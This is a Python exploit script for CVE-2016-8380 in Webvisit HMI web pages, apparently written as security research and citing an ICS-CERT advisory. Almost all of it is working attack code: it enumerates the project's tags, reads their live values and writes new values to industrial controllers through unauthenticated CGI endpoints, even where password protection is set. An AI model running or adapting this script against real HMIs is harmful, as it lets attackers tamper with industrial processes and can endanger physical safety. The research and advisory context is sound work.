#! /usr/bin/env python3
r''' 
	Copyright 2018 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        File name CVE-2016-8380.py
        written by tijl[dot]deneut[at]howest[dot]be
        
        In cooperation with Lars De Maesschalck, Michael De Vos and Robbe Vuylsteke
        
        More info:
        https://ics-cert.us-cert.gov/advisories/ICSA-313-01
        --> Script to exploit CVE-2016-8380 and probably CVE-2016-8371
        
        Script to read and write tags via a Webvisit HMI page (even in case of a password protection)
        Steps:
        * Get Project Name: http://<ip>/
        * Get list of tags: http://<ip>/<projectname>.tcr
        * Get current values of tags: http://<ip>/cgi-bin/ILRReadValues.exe
        * Set new tag values: http://<ip>/cgi-bin/writeVal.exe?<tag>+<value> (urlencode!)
'''
import urllib.request, urllib.parse, sys, os

def getValues(lstTagList, sIP):
    sPost = '<body>'
    sPost += '<item_list_size>{}</item_list_size>'.format(len(lstTagList))
    sPost += '<item_list>'
    for sItem in lstTagList: sPost += '<i><n>{}</n></i>'.format(sItem)
    sPost += '</item_list></body>'
    oRequest = urllib.request.Request(url = 'http://{}/cgi-bin/ILRReadValues.exe'.format(sIP), data = sPost.encode())
    oResponse = urllib.request.urlopen(oRequest)
    
    sAllData = ''
    for bItem in oResponse.readlines(): sAllData += bItem.decode(errors='ignore')
    lstItems = sAllData.split('<i>')
    lstValues = []
    for sItem in lstItems:
        if not '</i>' in sItem: continue
        else:
            sName = sItem.split('<n>')[1].split('</n>')[0]
            sValue = sItem.split('<v>')[1].split('</v>')[0]
            lstValues.append((sName,sValue))
    return lstValues


if len(sys.argv) > 1: 
    sIP = sys.argv[1]
    if 'h' in sIP: exit('Usage: {} <HMI-IP>'.format(sys.argv[0]))
else: sIP = input('Please enter an IP [192.168.0.1]: ')
if sIP == '': sIP = '192.168.0.1'

try:
    oResponse = urllib.request.urlopen('http://'+sIP, timeout = 5)
except:
    input('[-] ## Critical Error with IP {}: no response\nPress Enter to exit'.format(sIP))
    exit()

sProject = None
for line in oResponse.readlines():
    if b'ProjectName' in line: sProject = line.split(b'VALUE="')[1].split(b'"')[0].decode()

if not sProject:
    input('[- ] ## Error, no "ProjectName" found on the main page\nPress Enter to exit')
    exit()

print('[+] -- Found project "{}", retrieving list of tags'.format(sProject))

try:
    oResponse = urllib.request.urlopen('http://{}/{}.tcr'.format(sIP, sProject), timeout = 5)
except:
    input('[-] ## Critical Error with IP {}: /{}.tcr not found\nPress Enter to exit'.format(sIP, sProject))
    exit()

lstTagList = []
boolFoundNrTags = False
for bLine in oResponse.readlines():
    if bLine.startswith(b'#!-- N ='):
        boolFoundNrTags = True
        sNumberOfTags = bLine.split(b'=')[1].strip()
        print('[+] -- There should be {} tags:'.format(sNumberOfTags.decode()))
    if not b'#' in bLine and b';' in bLine and boolFoundNrTags:
        sTag = bLine.split(b';')[0].strip().decode()
        lstTagList.append(sTag)
        print('    -- {}'.format(sTag))

input('\n### Press Enter to query them all ###')

while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    lstValues = getValues(lstTagList, sIP)
    print(' ---- Full list of tags and their values for project {}:'.format(sProject))
    i = 0
    print('{0:3} | {1:20} | {2:20}'.format(' ID', '     Tag Name', '   Tag Value'))
    for lstItem in lstValues:
        i += 1
        print('{0:3} | {1:20} | {2:20}'.format(i, lstItem[0], lstItem[1]))
    sAns = input('\n[?] Refresh, Edit or Quit? [R,e,q]: ').lower()
    if sAns == 'r' or sAns == '': continue
    elif sAns == 'e': 
        sAns2 = input('[?] Edit which tag ID? [1]: ').lower()
        if sAns2 == '': sAns2 = '1'
        sName = lstValues[int(sAns2)-1][0]
        sValue = lstValues[int(sAns2)-1][1]
        sAns3 = input('[?] Please enter new value for {} [{}]: '.format(sName, sValue))
        if sAns3 == '': sAns3 == sValue
        oResponse = urllib.request.urlopen('http://{}/cgi-bin/writeVal.exe?{}+{}'.format(sIP, sName, sAns3), timeout = 5)
    else: break
